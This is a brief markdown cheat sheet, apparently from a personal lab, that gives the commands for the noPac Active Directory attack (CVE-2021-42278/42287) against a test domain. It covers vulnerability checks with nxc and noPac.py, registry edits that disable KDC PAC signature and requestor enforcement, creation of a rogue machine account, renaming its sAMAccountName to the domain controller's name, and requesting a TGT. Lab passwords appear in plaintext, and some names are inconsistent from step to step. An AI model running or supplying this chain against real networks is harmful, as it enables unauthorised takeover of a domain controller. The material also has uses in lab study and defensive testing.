# noPAC 
---

### Check HOST
```
nxc smb 192.168.0.239 -u nopac -p 'P@ssw0rd_OxsiuM_2026!' -M nopac

python3 noPac.py warzone.oxsium.local/Administrator:'sako2005!' -dc-ip 192.168.0.239 -use-ldap
```

### Ldap Environment
```
# KrbtgtFullPacSignature (İmza Yoxlamasının Söndürülməsi)
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc" -Name "KrbtgtFullPacSignature" -Value 0 -PropertyType DWORD -Force

# PacRequestorEnforcement (Uyğunluq Yoxlamasının Söndürülməsi)
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc" -Name "PacRequestorEnforcement" -Value 0 -PropertyType DWORD -Force

# Restart-Service Kdc -Force (Dəyişikliklərin Tətbiqi)
Restart-Service Kdc -Force
```


================================================================================================================================================================================================================================================================================================================================================================================
### Add Computer
```
Import-Module .\PowerView.ps1
New-DomainComputer -ComputerName "OXS-NOPAC" -UserPassword "ComputerPass123!" -Verbose
```

### Search Domain Controller Name
```
ldapsearch -x -H ldap://192.168.0.239 -D "Administrator@warzone.oxsium.local" -w 'sako2005!' -b "DC=warzone,DC=oxsium,DC=local" '(&(objectClass=computer))' | grep 'Domain Controller'

[WIN-WARZONE], Domain Controllers, warzone.oxsium.local
   DC Name

PowerView
Get-DomainController
```

### CVE-2021-42278 (SAM Name Spoofing)
```
# ADSI
$newComputer.Put("sAMAccountName", "WIN-WARZONE")
$newComputer.SetInfo()

# With AD Module
Set-ADComputer -Identity "OXS-TEST-20" -SamAccountName "DC01"

# Check sAMAccountName
Get-ADComputer -Filter "Name -eq 'OXS-TEST-20'" | Select-Object Name, SamAccountName
```

### CVE-2021-42287 (KDC Impersonation)
```
python3 getTGT.py 'warzone.oxsium.local/WIN-WARZONE:ComputerPass123'
```

### Retry Change Computer Name
```
# Without AD Module
$dn = "CN=WIN-WARZONE,CN=Computers,DC=lab,DC=local"
$pc = [ADSI]"LDAP://$dn"
$pc.Put("sAMAccountName", "OXS-ROGUE")
$pc.SetInfo()

# With AD Module
Set-ADComputer -Identity "WIN-WARZONE" -SamAccountName "OXS-ROGUE"

# Check sAMAccountName
Get-ADComputer -Filter "Name -eq 'WIN-WARZONE'" | Select-Object Name, SamAccountName
```
